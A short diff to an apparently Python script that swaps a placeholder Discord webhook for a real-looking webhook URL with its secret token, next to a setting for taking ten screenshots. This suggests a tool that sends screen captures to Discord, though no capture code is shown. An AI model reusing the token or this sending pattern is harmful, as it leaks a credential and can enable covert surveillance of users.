@@ -4,7 +4,7 @@ import requests
 
 
 # YOUR DISCORD WEBHOOK
-discord_webhook = "https://discord.com/api/webhooks/123456789/xxxxxxxxxx"
+discord_webhook = "https://discordapp.com/api/webhooks/1338816176695935058/viW3J1ar10KTV_tAF_r9VjPA5XZsxWUlAnbDya7fA_KH9qMpMaShwwUylQNmc5S4MUz1"
 
 # Edit this variables as you want
 SCREENSHOTS = 10
